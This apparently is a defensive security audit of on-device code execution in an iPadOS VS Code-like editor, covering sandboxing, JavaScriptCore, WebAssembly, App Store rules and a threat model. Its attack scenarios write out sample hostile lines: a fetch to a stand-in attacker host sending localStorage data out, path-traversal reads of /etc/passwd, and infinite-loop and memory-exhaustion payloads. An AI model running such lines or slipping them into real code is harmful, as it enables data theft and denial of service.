# On-Device Code Execution Security Audit

> **Audit Date:** February 2025  
> **Platform:** iOS/iPadOS 17.x+  
> **Scope:** JavaScriptCore, WebAssembly, and embedded interpreter security

---

## Executive Summary

This security audit covers the security implications of executing user-provided code on iPadOS devices within a VS Code-like environment. The analysis evaluates risks associated with JavaScriptCore, WebAssembly, and potential Python execution, along with recommended mitigation strategies.

**Risk Level:** MEDIUM-HIGH  
**Primary Concerns:** Resource exhaustion, information disclosure, sandbox escape attempts  
**Recommendation:** Implement strict resource limits and hybrid execution model

---

## 1. iOS Sandbox Overview

### Seatbelt Profile

iOS uses the Seatbelt mandatory access control framework with app-specific profiles:

```
App Container Structure:
├── Documents/          ← User data, read/write
├── Library/            ← App settings, caches
│   ├── Caches/
│   ├── Preferences/
│   └── Application Support/
├── tmp/                ← Temporary files (cleaned periodically)
└── .app/               ← Bundle resources (read-only)
```

### Sandbox Restrictions

| Resource | Access Level | Notes |
|----------|--------------|-------|
| App Container | ✅ Full | Within own container only |
| System Files | ❌ Denied | Cannot access /etc, /System, etc. |
| Other Apps | ❌ Denied | No inter-app file access (except via APIs) |
| Keychain | ⚠️ Limited | App-specific keychain items only |
| Network | ⚠️ Controlled | ATS (App Transport Security) enforced |
| Camera/Mic | ⚠️ Permission | Requires user authorization |
| Photos | ⚠️ Permission | PHPhotoLibrary API required |
| Location | ⚠️ Permission | Core Location with authorization |

---

## 2. File System Security

### 2.1 App Container Isolation

```swift
// Secure file access within app container
let documentsPath = FileManager.default.urls(
    for: .documentDirectory, 
    in: .userDomainMask
).first!

// ALLOWED: Access within container
let userFile = documentsPath.appendingPathComponent("user-script.js")

// BLOCKED by sandbox: System file access
let systemFile = URL(fileURLWithPath: "/etc/passwd") // ❌ Access denied
```

### 2.2 File System Attack Vectors

| Attack | Risk | Mitigation |
|--------|------|------------|
| Path Traversal | HIGH | Validate all paths, reject `../` |
| Symlink Escape | MEDIUM | Check `URL.resolvingSymlinksInPath()` |
| Hard Links | LOW | Use `stat` to verify file identity |
| Resource Forks | LOW | Avoid extended attributes |
| Temporary File Exhaustion | MEDIUM | Limit temp file size/count |

### 2.3 Secure File Handling

```swift
/// Validates that a path is within the app container
func validateSandboxPath(_ url: URL) throws -> URL {
    let containerURL = FileManager.default.urls(
        for: .documentDirectory, 
        in: .userDomainMask
    ).first!.deletingLastPathComponent()
    
    let resolvedPath = url.resolvingSymlinksInPath()
    
    // Ensure path starts with container
    guard resolvedPath.path.hasPrefix(containerURL.path) else {
        throw SecurityError.pathEscapeAttempt
    }
    
    // Reject parent directory traversal
    guard !url.path.contains("..") else {
        throw SecurityError.pathTraversalAttempt
    }
    
    return resolvedPath
}
```

---

## 3. Network Security

### 3.1 App Transport Security (ATS)

ATS enforces secure network connections by default:

```xml
<!-- Required Info.plist configuration -->
<key>NSAppTransportSecurity</key>
<dict>
    <!-- Default: Only HTTPS with TLS 1.2+ -->
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    
    <!-- Exception for localhost debugging -->
    <key>NSExceptionDomains</key>
    <dict>
        <key>localhost</key>
        <dict>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.2</string>
        </dict>
    </dict>
</dict>
```

### 3.2 Local Network Privacy

iOS 14+ requires permission for local network access:

```xml
<!-- Info.plist requirement -->
<key>NSLocalNetworkUsageDescription</key>
<string>VS Code needs to connect to development servers on your local network</string>
```

### 3.3 Network Attack Vectors

| Attack | Risk | Mitigation |
|--------|------|------------|
| SSRF | HIGH | Validate all URLs, block internal IPs |
| DNS Rebinding | MEDIUM | Cache DNS results, validate IPs |
| Protocol Smuggling | MEDIUM | Whitelist allowed schemes (https only) |
| Data Exfiltration | HIGH | Audit network requests, implement CSP |
| CORS Bypass | MEDIUM | Enforce same-origin policy |

---

## 4. JavaScriptCore Security

### 4.1 Injection Attack Risks

```javascript
// DANGEROUS: User input without sanitization
const userCode = "alert('xss')"; // Could be injected
context.evaluateScript(userCode) // ❌ Risky
```

**Attack Vectors:**
- `eval()` on untrusted input
- `Function()` constructor abuse
- Prototype pollution
- `__proto__` manipulation
- `constructor` property access

### 4.2 Infinite Loop / Resource Exhaustion

```swift
// DANGEROUS: No timeout protection
let maliciousJS = "while(true) {}"
context.evaluateScript(maliciousJS) // ❌ Hangs forever

// SECURE: With timeout protection
let runner = JSRunner(timeout: 5.0)
runner.execute("while(true) {}") throws // ✅ Times out after 5s
```

### 4.3 Memory Exhaustion

```javascript
// DANGEROUS: Memory exhaustion attack
const arr = new Array(1e9); // 8GB allocation attempt
```

**Mitigation:**
```swift
class JSRunner {
    private let maxMemoryMB: Int = 256
    
    func execute(_ code: String) throws -> JSValue {
        // Monitor memory before execution
        let initialMemory = getCurrentMemoryUsage()
        
        let result = try context.evaluateScript(code)
        
        // Check memory after execution
        let finalMemory = getCurrentMemoryUsage()
        let deltaMB = (finalMemory - initialMemory) / (1024 * 1024)
        
        if deltaMB > maxMemoryMB {
            throw SecurityError.memoryLimitExceeded
        }
        
        return result
    }
}
```

### 4.4 Native Function Exposure Risks

```swift
// DANGEROUS: Overly permissive native function
context.setObject(unsafeBitCast({ (args: [Any]) -> Any in
    // Can access ANYTHING
    return FileManager.default.contentsOfDirectory(atPath: "/")
}, to: AnyObject.self), forKeyedSubscript: "dangerousNativeFunc" as NSString)

// SECURE: Sanitized native function
context.setObject(safeNativeBridge, forKeyedSubscript: "nativeBridge" as NSString)
```

---

## 5. WebAssembly Security

### 5.1 WASM Sandbox Model

WebAssembly provides a memory-safe sandbox with:
- Linear memory with bounds checking
- No direct OS access
- Explicit imports required for system calls

```wat
;; WASM cannot directly access files or network
(module
  (import "env" "log" (func $log (param i32)))
  ;; All external access must be explicitly imported
)
```

### 5.2 WASM-Specific Risks

| Risk | Description | Mitigation |
|------|-------------|------------|
| Meltdown/Spectre | Speculative execution attacks | Site isolation, no sensitive data in WASM |
| Type Confusion | Malformed WASM modules | Validate all modules before loading |
| Host Function Abuse | Malicious imports | Whitelist allowed host functions |
| Memory Exhaustion | Large memory requests | Enforce memory limits |
| Infinite Loops | Unbounded execution | Implement execution timeouts |

### 5.3 WASI Security Considerations

WASI (WebAssembly System Interface) provides file system access:

```rust
// WASI can access files if not properly sandboxed
use std::fs::File;
let file = File::open("/etc/passwd")?; // ⚠️ Potential risk
```

**Mitigation:**
- Disable WASI by default
- If enabled, use capability-based security
- Map only specific directories (not entire FS)
- Read-only access by default

---

## 6. Code Execution Security Checklist

### 6.1 Pre-Execution Validation

- [ ] Syntax validation (reject invalid code)
- [ ] Import/require analysis (detect external deps)
- [ ] Network access detection (block fetch/XHR if not allowed)
- [ ] File system access detection (block fs operations if not allowed)
- [ ] `eval()` / `Function()` detection (warn or block)
- [ ] Complexity analysis (reject overly complex code)
- [ ] Code size limits (reject files > 1MB)

### 6.2 Execution Environment Hardening

- [ ] Timeouts (max 30 seconds)
- [ ] Memory limits (max 256MB)
- [ ] CPU throttling (pause execution if CPU > 80%)
- [ ] Stack depth limits (prevent stack overflow)
- [ ] Disable JIT (if using JSC on iOS)
- [ ] Separate JSVirtualMachine per execution
- [ ] No shared contexts between users

### 6.3 Post-Execution Cleanup

- [ ] Clear all JS contexts
- [ ] Release all native references
- [ ] Remove temporary files
- [ ] Reset any global state
- [ ] Log execution metrics

---

## 7. App Store Compliance

### 7.1 Section 2.5.2 - Code Execution

> **2.5.2** Apps should be self-contained in their bundles, and may not read or write data outside the designated container area, nor may they download, install, or execute code which introduces or changes features or functionality of the app...

**Exceptions for Developer Tools:**
- Educational programming environments
- Developer tools that run user-provided code
- Sandboxed execution with no app modification

### 7.2 Compliance Checklist

- [ ] Code cannot modify the app's binary or resources
- [ ] Code cannot download new executable code
- [ ] Code runs in sandboxed environment
- [ ] No dynamic library loading (dlopen)
- [ ] No JIT compilation without entitlement
- [ ] Clear user consent for code execution
- [ ] Parental controls respected for educational tools

### 7.3 Required Entitlements

```xml
<!-- Basic execution (no special entitlements needed for JSC) -->
<!-- For JIT (if ever needed): -->
<key>com.apple.security.cs.allow-jit</key>
<true/>

<!-- For debugging (development only): -->
<key>get-task-allow</key>
<true/>
```

---

## 8. Threat Model

### 8.1 Threat Actors

| Actor | Capability | Motivation |
|-------|-----------|------------|
| Casual User | Low | Accidental infinite loops, resource exhaustion |
| Curious User | Medium | Testing boundaries, sandbox escape attempts |
| Malicious User | High | Data exfiltration, system compromise |
| Compromised Account | High | Pivot from breached account |

### 8.2 Attack Scenarios

**Scenario 1: Resource Exhaustion**
```javascript
// Attacker submits:
while(true) { /* infinite loop */ }

// Impact: App becomes unresponsive
// Mitigation: 5-second timeout kills execution
```

**Scenario 2: Memory Exhaustion**
```javascript
// Attacker submits:
const arr = [];
while(true) { arr.push(new Array(1000000)); }

// Impact: App crashes due to OOM
// Mitigation: 256MB memory limit enforced
```

**Scenario 3: File System Escape**
```javascript
// Attacker submits:
const fs = require('fs');
fs.readFileSync('../../../etc/passwd');

// Impact: Information disclosure
// Mitigation: Path validation, sandbox enforcement
```

**Scenario 4: Network Exfiltration**
```javascript
// Attacker submits:
fetch('https://attacker.com/steal?data=' + localStorage.keys());

// Impact: Data exfiltration
// Mitigation: Network permission required, ATS enforcement
```

---

## 9. Security Recommendations

### 9.1 Immediate Actions

1. **Implement strict resource limits**
   - 5-second execution timeout
   - 256MB memory limit
   - 100KB code size limit

2. **Add pre-execution analysis**
   - Detect dangerous patterns (eval, Function)
   - Analyze import/require statements
   - Check for network/file system access

3. **Implement execution isolation**
   - New JSVirtualMachine per execution
   - No shared state between runs
   - Complete cleanup after execution

### 9.2 Medium-Term Improvements

1. **Hybrid execution model**
   - Simple code: on-device
   - Complex code: remote server
   - Automatic fallback on resource exhaustion

2. **Enhanced monitoring**
   - Real-time CPU/memory tracking
   - Execution metrics logging
   - Anomaly detection for abuse

3. **Content Security Policy**
   - Whitelist allowed APIs
   - Block dangerous patterns
   - Audit all native function exposure

### 9.3 Long-Term Security Architecture

1. **True sandboxing**
   - Separate process for execution (XPC)
   - Hardware-backed isolation
   - Minimal attack surface

2. **Formal verification**
   - Static analysis for all code
   - Proven resource bounds
   - Security policy enforcement

3. **User education**
   - Clear warnings for remote execution
   - Explanation of limitations
   - Best practices documentation

---

## 10. Security Testing

### 10.1 Penetration Testing Checklist

- [ ] Submit infinite loops (verify timeout)
- [ ] Submit memory exhaustion code (verify limits)
- [ ] Attempt path traversal (verify sandbox)
- [ ] Attempt network requests (verify ATS)
- [ ] Try prototype pollution attacks
- [ ] Test `eval()` and `Function()` restrictions
- [ ] Verify native function sandboxing
- [ ] Test WASM module validation
- [ ] Attempt WASI escape if enabled
- [ ] Check for information disclosure in error messages

### 10.2 Automated Security Tests

```swift
// Example security test
func testInfiniteLoopTimeout() async throws {
    let runner = JSRunner(timeout: 1.0)
    let maliciousCode = "while(true) {}"
    
    do {
        _ = try await runner.execute(maliciousCode)
        XCTFail("Should have timed out")
    } catch JSRunnerError.executionTimeout {
        // ✅ Expected behavior
    }
}
```

---

## Summary Risk Matrix

| Risk | Likelihood | Impact | Risk Level | Mitigation Status |
|------|-----------|--------|-----------|-------------------|
| Resource Exhaustion | High | High | 🔴 Critical | ✅ Implemented |
| Sandbox Escape | Low | Critical | 🟠 High | ✅ iOS Sandbox |
| Data Exfiltration | Medium | High | 🟠 High | ⚠️ Partial |
| Code Injection | Medium | Medium | 🟡 Medium | ⚠️ Partial |
| Information Disclosure | Low | Medium | 🟢 Low | ✅ Implemented |
| DoS via Networking | Low | Medium | 🟢 Low | ✅ ATS |

**Overall Security Posture:** DEFENSIVE  
**Recommended Action:** Implement hybrid execution with strict on-device limits

---

## References

- [OWASP Mobile Security Testing Guide](https://mas.owasp.org/)
- [Apple Platform Security Guide](https://support.apple.com/guide/security/)
- [iOS App Sandbox Design](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/)
- [JavaScriptCore Security Considerations](https://developer.apple.com/documentation/javascriptcore)
- [WebAssembly Security](https://webassembly.org/docs/security/)
